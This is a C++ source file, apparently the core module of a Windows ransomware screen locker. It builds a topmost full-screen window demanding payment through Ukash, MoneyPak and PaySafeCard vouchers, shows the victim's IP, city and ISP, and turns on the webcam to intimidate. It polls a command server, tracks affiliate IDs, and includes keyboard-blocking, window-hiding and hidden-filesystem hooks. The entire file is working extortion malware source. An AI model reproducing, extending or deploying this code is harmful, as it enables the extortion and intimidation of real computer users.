#define SYS_ALLOCATOR(sz) VirtualAlloc(NULL, sz, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)
#define SYS_DEALLOCATOR(ptr) VirtualFree(ptr, 0, MEM_RELEASE)

#include "locker.h"
#include "gui/zgui.h"

#ifndef _DEBUG
#include "runtime.cpp"
#else
void* __cdecl operator new(size_t, void* p)
{
    return p;
}
#endif

#include "../shared.h"

#include "../../../shared/debug.c"
#include "../../../shared/utils.c"

#include "config.h"
#include "keyboard_locker.h"
#include "socket.h"
#include "server_netcomm.h"
#include "voucher_control.h"
#include "alert_window.h"
#include "voucher_processing.h"
#include "windows_hider.h"

#include "config_data.h"

// #include "res.h"
#include "gui/zgui.cpp"
#include "voucher_control.h"
#include "alert_window.h"
#include "voucher_processing.h"
#include "keyboard_locker.h"
#include "windows_hider.h"

void* cvec_reallocate(void* pBuffer, size_t newSize)
{
    void* pNewBuffer;

    if (pBuffer == NULL) {
        pNewBuffer = ::HeapAlloc(::GetProcessHeap()/*gHeap*/, HEAP_ZERO_MEMORY, newSize);
    }
    else {
        pNewBuffer = ::HeapReAlloc(::GetProcessHeap()/*gHeap*/, HEAP_ZERO_MEMORY, pBuffer, newSize);
    }

    return pNewBuffer;
}

#include "config.cpp"
#include "alert_window.cpp"
#include "keyboard_locker.cpp"
#include "socket.cpp"
#include "server_netcomm.cpp"
#include "voucher_control.cpp"
#include "voucher_processing.cpp"
#include "windows_hider.cpp"

//#include "keyboard_lock.h"
// #include "exe_mem_loader.h"
//HANDLE ::GetProcessHeap()/*gHeap*/;
uint32_t gAffId;
uint32_t gSubId;

#ifndef SIMPLE_MODE
dll_block_t gDllBlock;
#endif // SIMPLE_MODE
OSVERSIONINFO gOsVerInfo;
int gThreadAlive = 1;
HANDLE gHThread = NULL;
HANDLE gHProcess;
DWORD gProcessId = 0;
uint8_t* pExeLocker = NULL;
HANDLE gHMapping = NULL;
uint8_t* pShutdownToken = NULL;

Gdiplus::GdiplusStartupInput _gdsi;
ULONG_PTR _gdiToken;

namespace zgui
{

class ELockerFrameWnd : public Window, public INotifyUI
{
public:
    ELockerFrameWnd() :
    _pMpakVoucherControl(0),
    _pUkashVoucherControl(0),
    _pPscVoucherControl(0)
    {
    }

    LPCTSTR GetWindowClassName() const
    {
        return _T("UIMainFrame");
    };

    UINT GetClassStyle() const {
        return CS_DBLCLKS;
    };

    void OnFinalMessage(HWND /*hWnd*/)
    {
        delete this;
    };

    void Init()
    {
        _pCamera = static_cast<Camera*>(_paintMgr.FindControl("maincam"));

        if (_pCamera != 0) {
            StringArray cameras;
            Camera::enumerate(&cameras);
            if (cameras.size() > 0) {
                _pCamera->SetVisible(true);
            }
        }
         
        _pNodeInfo = static_cast<CTextUI*>(_paintMgr.FindControl("nodeinf"));

        if (_pNodeInfo != 0) {
            zgui::String nodeInfo;
            zgui::StringArray infoParts;
            LockerConfig* pCfg = LockerConfig::getInstance();

            //MessageBoxW(NULL, L"OK", _pNodeInfo->GetText().toWideCharPointer(), MB_OK);
            
            infoParts.addTokens(_pNodeInfo->GetText(), ";", zgui::String::empty);

            

            if (infoParts.size() == 4) {
                nodeInfo << infoParts[0] << pCfg->botIp << " |" << infoParts[1] << pCfg->botCity << " |" << infoParts[2] << pCfg->botISP << infoParts[3];

                _pNodeInfo->SetText(nodeInfo);
                _pNodeInfo->SetVisible();
            }
        }

        //MessageBoxW(NULL, L"OK", L"OK", MB_OK);
    }

    void OnPrepare()
    {
        CVerticalLayoutUI* pPaymentLayout = static_cast<CVerticalLayoutUI*>(_paintMgr.FindControl("mpak"));
        if (pPaymentLayout != 0) {
            _pMpakVoucherControl = new ELockerMpakVoucherControl(pPaymentLayout, &_paintMgr, _hWnd);
        }

        pPaymentLayout = static_cast<CVerticalLayoutUI*>(_paintMgr.FindControl("ukash"));
        if (pPaymentLayout != 0) {
            _pUkashVoucherControl = new ELockerUkashVoucherControl(pPaymentLayout, &_paintMgr, _hWnd);
        }

        pPaymentLayout = static_cast<CVerticalLayoutUI*>(_paintMgr.FindControl("psc"));
        if (pPaymentLayout != 0) {
            _pPscVoucherControl = new ELockerPscVoucherControl(pPaymentLayout, &_paintMgr, _hWnd);
        }
        
        LockerControlThread* pCtrl = LockerControlThread::getInstance();
        pCtrl->setPaintManager(&_paintMgr, GetHWND());
        pCtrl->startThread();
    }

    void Notify(TNotifyUI& msg)
    {
        if (msg.sType == "windowinit") {
            OnPrepare();
        }
        else if (msg.sType == "click") {
            if (_pMpakVoucherControl != 0) {
                _pMpakVoucherControl->handleButtonClick(msg);
            }
            if (_pUkashVoucherControl != 0) {
                _pUkashVoucherControl->handleButtonClick(msg);
            }
            if (_pPscVoucherControl != 0) {
                _pPscVoucherControl->handleButtonClick(msg);
            }
//                 if (msg.pSender == m_pCloseBtn) {
//                     PostQuitMessage(0);
//                     return;
//                 }
//                 else if (msg.pSender == m_pMinBtn) { 
//                     SendMessage(WM_SYSCOMMAND, SC_MINIMIZE, 0);
//                     return;
//                 }
//                 else if( msg.pSender == m_pMaxBtn ) { 
//                     SendMessage(WM_SYSCOMMAND, SC_MAXIMIZE, 0);
//                     return;
//                 }
//                 else if( msg.pSender == m_pRestoreBtn ) { 
//                     SendMessage(WM_SYSCOMMAND, SC_RESTORE, 0);
//                     return;
//                 }
        }
        else if (msg.sType == "vcomplete") {
            Close();
            //::PostQuitMessage(0L);
        }
    }

    LRESULT OnCreate(UINT /*uMsg*/, WPARAM /*wParam*/, LPARAM /*lParam*/, BOOL& /*bHandled*/)
    {
        LONG styleValue = ::GetWindowLong(*this, GWL_STYLE);
        styleValue &= ~WS_CAPTION;
        ::SetWindowLong(*this, GWL_STYLE, styleValue | WS_CLIPSIBLINGS | WS_CLIPCHILDREN);

        _paintMgr.Init(_hWnd);
        GuiBuilder builder;
        CControlUI* pRoot = builder.Create("common.xml", (UINT)0, 0, &_paintMgr);
        ASSERT(pRoot && "Failed to parse XML");
        _paintMgr.AttachDialog(pRoot);
        _paintMgr.AddNotifier(this);

        Init();

        _pCamera->startCapture();

        return 0;
    }

    LRESULT OnClose(UINT /*uMsg*/, WPARAM /*wParam*/, LPARAM /*lParam*/, BOOL& bHandled)
    {
        bHandled = FALSE;
        return 0;
    }

    LRESULT OnDestroy(UINT /*uMsg*/, WPARAM /*wParam*/, LPARAM /*lParam*/, BOOL& bHandled)
    {
        ::PostQuitMessage(0L);

        bHandled = FALSE;
        return 0;
    }

    LRESULT OnNcActivate(UINT /*uMsg*/, WPARAM wParam, LPARAM /*lParam*/, BOOL& bHandled)
    {
        if (::IsIconic(*this)) {
            bHandled = FALSE;
        }
        return (wParam == 0) ? TRUE : FALSE;
    }

    LRESULT OnNcCalcSize(UINT /*uMsg*/, WPARAM /*wParam*/, LPARAM /*lParam*/, BOOL& /*bHandled*/)
    {
        return 0;
    }

    LRESULT OnNcPaint(UINT /*uMsg*/, WPARAM /*wParam*/, LPARAM /*lParam*/, BOOL& /*bHandled*/)
    {
        return 0;
    }

    LRESULT OnNcHitTest(UINT uMsg, WPARAM wParam, LPARAM lParam, BOOL& /*bHandled*/)
    {
        POINT pt; pt.x = GET_X_LPARAM(lParam); pt.y = GET_Y_LPARAM(lParam);
        ::ScreenToClient(*this, &pt);

        RECT rcClient;
        ::GetClientRect(*this, &rcClient);

        // 		if( !::IsZoomed(*this) ) {
        // 			RECT rcSizeBox = m_pm.GetSizeBox();
        // 			if( pt.y < rcClient.top + rcSizeBox.top ) {
        // 				if( pt.x < rcClient.left + rcSizeBox.left ) return HTTOPLEFT;
        // 				if( pt.x > rcClient.right - rcSizeBox.right ) return HTTOPRIGHT;
        // 				return HTTOP;
        // 			}
        // 			else if( pt.y > rcClient.bottom - rcSizeBox.bottom ) {
        // 				if( pt.x < rcClient.left + rcSizeBox.left ) return HTBOTTOMLEFT;
        // 				if( pt.x > rcClient.right - rcSizeBox.right ) return HTBOTTOMRIGHT;
        // 				return HTBOTTOM;
        // 			}
        // 			if( pt.x < rcClient.left + rcSizeBox.left ) return HTLEFT;
        // 			if( pt.x > rcClient.right - rcSizeBox.right ) return HTRIGHT;
        // 		}

        RECT rcCaption = _paintMgr.GetCaptionRect();
        if (pt.x >= rcClient.left + rcCaption.left && pt.x < rcClient.right - rcCaption.right && pt.y >= rcCaption.top && pt.y < rcCaption.bottom) {
                CControlUI* pControl = static_cast<CControlUI*>(_paintMgr.FindControl(pt));
                if (pControl && lstrcmp(pControl->GetClass(), _T("ButtonUI")) != 0 && 
                    lstrcmp(pControl->GetClass(), _T("OptionUI")) != 0 &&
                    lstrcmp(pControl->GetClass(), _T("TextUI")) != 0) {
                    return HTCAPTION;
                }
        }

        return HTCLIENT;
    }

    LRESULT OnSize(UINT uMsg, WPARAM wParam, LPARAM lParam, BOOL& bHandled)
    {
        SIZE szRoundCorner = _paintMgr.GetRoundCorner();
        if (!::IsIconic(*this) && (szRoundCorner.cx != 0 || szRoundCorner.cy != 0)) {
            CDuiRect rcWnd;
            ::GetWindowRect(*this, &rcWnd);
            rcWnd.Offset(-rcWnd.left, -rcWnd.top);
            rcWnd.right++; rcWnd.bottom++;
            HRGN hRgn = ::CreateRoundRectRgn(rcWnd.left, rcWnd.top, rcWnd.right, rcWnd.bottom, szRoundCorner.cx, szRoundCorner.cy);
            ::SetWindowRgn(*this, hRgn, TRUE);
            ::DeleteObject(hRgn);
        }

        bHandled = FALSE;
        return 0;
    }

    LRESULT OnGetMinMaxInfo(UINT uMsg, WPARAM wParam, LPARAM lParam, BOOL& bHandled)
    {
        MONITORINFO oMonitor = {};
        oMonitor.cbSize = sizeof(oMonitor);
        ::GetMonitorInfo(::MonitorFromWindow(*this, MONITOR_DEFAULTTOPRIMARY), &oMonitor);
        CDuiRect rcWork = oMonitor.rcWork;
        rcWork.Offset(-oMonitor.rcMonitor.left, -oMonitor.rcMonitor.top);

        LPMINMAXINFO lpMMI = (LPMINMAXINFO) lParam;
        lpMMI->ptMaxPosition.x	= rcWork.left;
        lpMMI->ptMaxPosition.y	= rcWork.top;
        lpMMI->ptMaxSize.x		= rcWork.right;
        lpMMI->ptMaxSize.y		= rcWork.bottom;

        bHandled = FALSE;
        return 0;
    }

//     LRESULT OnSysCommand(UINT uMsg, WPARAM wParam, LPARAM lParam, BOOL& bHandled)
//     {
// //         if (wParam == SC_CLOSE) {
// //             ::PostQuitMessage(0L);
// //             bHandled = TRUE;
// //             return 0;
// //         }
// //         BOOL bZoomed = ::IsZoomed(*this);
//         LRESULT lRes = Window::HandleMessage(uMsg, wParam, lParam);
// //         if (::IsZoomed(*this) != bZoomed) {
// //             if (!bZoomed) {
// //                 CControlUI* pControl = static_cast<CControlUI*>(_paintMgr.FindControl("maxbtn"));
// //                 if (pControl) {
// //                     pControl->SetVisible(false);
// //                 }
// //                 pControl = static_cast<CControlUI*>(_paintMgr.FindControl("restorebtn"));
// //                 if (pControl) {
// //                     pControl->SetVisible(true);
// //                 }
// //             }
// //             else {
// //                 CControlUI* pControl = static_cast<CControlUI*>(_paintMgr.FindControl("maxbtn"));
// //                 if (pControl) {
// //                     pControl->SetVisible(true);
// //                 }
// //                 pControl = static_cast<CControlUI*>(_paintMgr.FindControl("restorebtn"));
// //                 if (pControl) {
// //                     pControl->SetVisible(false);
// //                 }
// //             }
// //         }
//         return lRes;
//     }

    LRESULT HandleMessage(UINT uMsg, WPARAM wParam, LPARAM lParam)
    {
        LRESULT lRes = 0;
        BOOL bHandled = TRUE;
        switch (uMsg) {
            case WM_CREATE:
                lRes = OnCreate(uMsg, wParam, lParam, bHandled);
                break;
            case WM_CLOSE:
                lRes = OnClose(uMsg, wParam, lParam, bHandled);
                break;
            case WM_DESTROY:
                lRes = OnDestroy(uMsg, wParam, lParam, bHandled);
                break;
            case WM_NCACTIVATE:
                lRes = OnNcActivate(uMsg, wParam, lParam, bHandled);
                break;
            case WM_NCCALCSIZE:
                lRes = OnNcCalcSize(uMsg, wParam, lParam, bHandled);
                break;
            case WM_NCPAINT:
                lRes = OnNcPaint(uMsg, wParam, lParam, bHandled);
                break;
            case WM_NCHITTEST:
                lRes = OnNcHitTest(uMsg, wParam, lParam, bHandled);
                break;
            case WM_SIZE:
                lRes = OnSize(uMsg, wParam, lParam, bHandled);
                break;
            case WM_GETMINMAXINFO:
                lRes = OnGetMinMaxInfo(uMsg, wParam, lParam, bHandled);
                break;
//             case WM_SYSCOMMAND:
//                 lRes = OnSysCommand(uMsg, wParam, lParam, bHandled);
//                 break;
            default:
                bHandled = FALSE;
        }
        if (bHandled) {
            return lRes;
        }
        if (_paintMgr.MessageHandler(uMsg, wParam, lParam, lRes)) {
            return lRes;
        }

        return Window::HandleMessage(uMsg, wParam, lParam);
    }

public:
    CPaintManagerUI _paintMgr;

private:
    Camera* _pCamera;
    CTextUI* _pNodeInfo;
    ELockerMpakVoucherControl* _pMpakVoucherControl;
    ELockerUkashVoucherControl* _pUkashVoucherControl;
    ELockerPscVoucherControl* _pPscVoucherControl;
};

}

// uint8_t getValue(const char ch)
// {
//     int i;
//     static const char chs1[16] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'E', 'f'};
//     static const char chs2[16] = {'Z', 'x', 'y', 'Y', 'i', 'j', 'q', 'm', 'S', 'p', 'N', 'M', 'I', 'O', 'h', 'w'};
// 
//     for (i = 0; i < 16; ++i) {
//         if (chs1[i] == ch) {
//             return i;
//         }
//         else if (chs2[i] == ch) {
//             return i;
//         }
//     }
// 
//     return 255;
// }
// 
// int process_http_body(const zgui::String& uriParams, zgui::String& outData)
// {
//     size_t i;
//     zgui::String data;
//     char outBuffer[256];
//     zgui::StringArray params;
//     params.addTokens(uriParams, "&", zgui::String::empty);
//     //Poco::StringTokenizer params(uriParams, "&", Poco::StringTokenizer::TOK_IGNORE_EMPTY | Poco::StringTokenizer::TOK_TRIM);
// 
//     for (i = 0; i < params.size(); ++i) {
//         zgui::StringArray parts;
// 
//         parts.addTokens(params[i], "=", zgui::String::empty);
// 
//         //Poco::StringTokenizer parts(params[i], "=", Poco::StringTokenizer::TOK_IGNORE_EMPTY | Poco::StringTokenizer::TOK_TRIM);
//         if (parts.size() != 2) {
//             //std::cout << "Too many parts of keyval" << std::endl;
//             return 0;
//         }
// 
//         data += parts[0];
//         if (parts[1] != "%20") {
//             data += parts[1];
//         }
//     }
// 
//     size_t dataSize = data.length() / 2;
//     for (i = 0; i < dataSize; ++i) {
//         uint8_t val;
//         uint8_t tmpVal = getValue(data[i*2]);
//         if (tmpVal == 255) {
//             return 0;
//         }
//         val = tmpVal;
//         tmpVal = getValue(data[i*2 + 1]);
//         if (tmpVal == 255) {
//             return 0;
//         }
//         val += (tmpVal << 4);
// 
//         outBuffer[i] = (char)val;
//     }
// 
//     LockerConfig* pCfg = LockerConfig::getInstance();
// 
//     pCfg->arc4_crypt_self((uint8_t*)outBuffer, dataSize);
//     //arc4_crypt_self((uint8_t*)outBuffer, dataSize, (const uint8_t*)_pGlobals->_key.c_str(), _pGlobals->_key.size());
//     if (outBuffer[64] != ';') {
//         return 0;
//     }
//     outData = outBuffer;
//     return 1;
// }

DWORD WINAPI locker_thread(void* pParam)
{
    size_t i, count;
//     ULONG heapInfValue = 2;
// 
//     // Создаём кучу.
//     gHeap = HeapCreate(0, 1024 * 1024, 0);
// 
//     if (gHeap == NULL) {
//         DBG_PRINTF(("Failed to create Heap\n"));
//         return 0;
//     }
//     // Устанавливаем низкую фрагментацию кучи.
//     HeapSetInformation(gHeap, HeapCompatibilityInformation, &heapInfValue, sizeof(heapInfValue));

#ifndef _DEBUG
    cpp_startup();
#endif 

    if (Gdiplus::GdiplusStartup(&_gdiToken, &_gdsi, 0) != Gdiplus::Ok) {
        return 0;
    }

    do {
        zgui::CPaintManagerUI::SetInstance(GetModuleHandle(NULL));

        HRESULT Hr = ::CoInitialize(NULL);
        if (FAILED(Hr)) {
            break;
        }

//         zgui::Resources::getInstance()->addSource((uint8_t*)res_data, sizeof(res_data));

        zgui::Resources::getInstance()->addSource((uint8_t*)config_data, sizeof(config_data));

        // Загружаем конфиг.
        LockerConfig* pCfg = LockerConfig::getInstance();
        if (!pCfg->loadConfig()) {
            break;
        }

//         {
//             zgui::String out;
//             process_http_body("qdh2hx=y0x8M&2iMY9q=0ybx9IShpM&Yy5=x6yqpwpijaIhYdYO&Z=IiIpywEj0mcm3Ij&w3p0Sa=Iqp1jNqZI3I6YcN&8q=1hdMx&N4jII=cMbjyxSxmh8Nwyq&SSmEj=iyYwOIxhYOch&0jb=MbZjNOpZq&Ii5N7N=mY6mcN&xwfm=pmOSfyYwaZ&O=mhZjSYMfSj&Z=qhqywixN1&hdxfYm=Sfy7", out);
//         }

        LockerControlThread* pCtrl = LockerControlThread::getInstance();

        if (!pCtrl->requestServer(LockerServerNetcomm::GetInfo)) {
            break;
        }

        if (!(pCfg->ukashCountries.contains(pCfg->botCountryCode) || pCfg->mpakCountries.contains(pCfg->botCountryCode) || pCfg->pscCountries.contains(pCfg->botCountryCode))) {
            // Страна не поддерживается, поэтому возвращаем статус Good, чтобы локер удалился из системы.
            LockerConfig::getInstance()->activeVoucherStatus = LockerConfig::Good;
            break;
        }

        if (!pCtrl->requestServer(LockerServerNetcomm::CheckStatus)) {
            break;
        }

        if (LockerConfig::getInstance()->activeVoucherStatus == LockerConfig::Good) {
            break;
        }

        // Загружаем ресурсы с сервера.
        if (!pCtrl->requestServer(LockerServerNetcomm::LoadRes)) {
            break;
        }

        zgui::ELockerFrameWnd* pFrame = new zgui::ELockerFrameWnd();
        if (pFrame == 0) {
            break;
        }

        pFrame->Create(NULL, _T(""), UI_WNDSTYLE_FRAME, WS_EX_TOPMOST, 0, 0, 800, 572);
        pFrame->CenterWindow();
        ::ShowWindow(*pFrame, SW_SHOW);

//         LockerWindowsHiderThread::getInstance()->startThread();
// 
// #ifndef SIMPLE_MODE
//         userio_keyboard_hook(1);
//         userio_keyboard_block(1);
// #else
//         locker_keyboard_enable_disable(false);
// #endif // SIMPLE_MODE

        zgui::CPaintManagerUI::MessageLoop();

        //delete pFrame;

//         LockerWindowsHiderThread::getInstance()->stopThread(3000);
//         LockerWindowsHiderThread::deleteInstance();
// 
// #ifndef SIMPLE_MODE
//         userio_keyboard_block(0);
//         userio_keyboard_hook(0);
// #else
//         locker_keyboard_enable_disable(true);
// #endif // SIMPLE_MODE
    } while (0);

#ifdef SIMPLE_MODE
    int vStatus = LockerConfig::getInstance()->activeVoucherStatus;
#endif // SIMPLE_MODE

    LockerControlThread::deleteInstance();
    LockerServerNetcomm::deleteInstance();    
    LockerConfig::deleteInstance();
    zgui::Resources::deleteInstance();

    Gdiplus::GdiplusShutdown(_gdiToken);

    ::CoUninitialize();

#ifndef _DEBUG
    cpp_shutdown();
#endif
    
#ifdef SIMPLE_MODE
    return vStatus;
#else
    CloseHandle(gHThread);
    return 0;
#endif // SIMPLE_MODE
}

BOOLEAN create_locker_thread()
{
    DWORD threadId;

    gHThread = CreateThread(NULL, 0, locker_thread, NULL, 0, &threadId);
    //gHThread = NULL;
    
    return (gHThread != NULL);
}

BOOL WINAPI DllMain(HANDLE /*_HDllHandle*/, DWORD _Reason, plocker_data_t pLockerData)
{
#ifdef SIMPLE_MODE
    if (_Reason == DLL_PROCESS_ATTACH) {
        gAffId = pLockerData->affId;
        gSubId = pLockerData->subId;
        return locker_thread(0);
    }
#endif // SIMPLE_MODE
    return 1;
}



#ifdef _CONSOLE

#ifdef _DEBUG
int __stdcall WinMain( __in HINSTANCE hInstance, __in_opt HINSTANCE hPrevInstance, __in_opt LPSTR lpCmdLine, __in int nShowCmd )
#else
int __stdcall Main(/* __in HINSTANCE hInstance, __in_opt HINSTANCE hPrevInstance, __in_opt LPSTR lpCmdLine, __in int nShowCmd */)
#endif
//int __cdecl main(int argc, char** argv)

#else



int LoadRequest(pdll_block_t pDllBlock)

#endif
{
#if !defined(_CONSOLE) && !defined(SIMPLE_MODE)
    int ret = 0;
#endif
//     wchar_t mappingName[32];
//     int i;
//     
//     
//     static const wchar_t literals[16] = {L'0',L'1',L'2',L'3',L'4',L'5',L'6',L'7',L'8',L'9',L'A',L'B',L'C',L'D',L'E',L'F'};

    gOsVerInfo.dwOSVersionInfoSize = sizeof(gOsVerInfo);
    GetVersionEx(&gOsVerInfo);

#if !defined(_CONSOLE) && !defined(SIMPLE_MODE)
    memcpy((uint8_t*)&gDllBlock, (uint8_t*)pDllBlock, sizeof(dll_block_t));

    DBG_PRINTF(("Startup information:\n"));
    DBG_PRINTF(("- NTDLL.DLL base = 0x%08X\n", gDllBlock.ntdllBase));
    DBG_PRINTF(("- KERNEL.DLL base = 0x%08X\n", gDllBlock.kernel32Base));
    DBG_PRINTF(("- Self base = 0x%08X\n", gDllBlock.selfBase));
    DBG_PRINTF_ARR("- Install key", gDllBlock.installKey, sizeof(gDllBlock.installKey));
    DBG_PRINTF_ARR("- Boot key", gDllBlock.bootKey, sizeof(gDllBlock.bootKey));
    DBG_PRINTF_ARR("- FS key", gDllBlock.fsKey, sizeof(gDllBlock.fsKey));
    DBG_PRINTF_ARR("- Client ID", gDllBlock.clientId, sizeof(gDllBlock.clientId));
#endif // _CONSOLE

#if !defined(_CONSOLE) && !defined(SIMPLE_MODE)
    // Инициализируем API для взаимодействия с ZFS.
    ret = zuserio_init(gDllBlock.fsKey, gDllBlock.clientId);
    DBG_PRINTF(("zuserio_init() returned %X\n", ret));
    if (ret != ERR_OK) {
        return 0;
    }

#endif // _CONSOLE

    if (!create_locker_thread()) {
        return 0;
    }

#ifdef _CONSOLE
    WaitForSingleObject(gHThread, INFINITE);
    //UnloadRequest(NULL);
    ExitProcess(1);
#endif // _CONSOLE

    return 1;
}

int UnloadRequest(pdll_block_t pDllBlock)
{
    DBG_PRINTF(("Unload request\n"));
#if !defined(_CONSOLE) && !defined(SIMPLE_MODE)
    if (utils_memcmp(gDllBlock.clientId, pDllBlock->clientId, sizeof(pDllBlock->clientId)) != 0) {
        DBG_PRINTF(("Client ID is not equal with older one\n"));
    }
#endif // _CONSOLE
    if (gHThread != NULL) {
        gThreadAlive = 0;

        if (WaitForSingleObject(gHThread, 11 * 1000) == WAIT_TIMEOUT) {
            TerminateThread(gHThread, 1);
            DBG_PRINTF(("Thread terminated!\n"));
        }
        CloseHandle(gHThread);
    }

//     zuserio_shutdown();

    return 1;
}
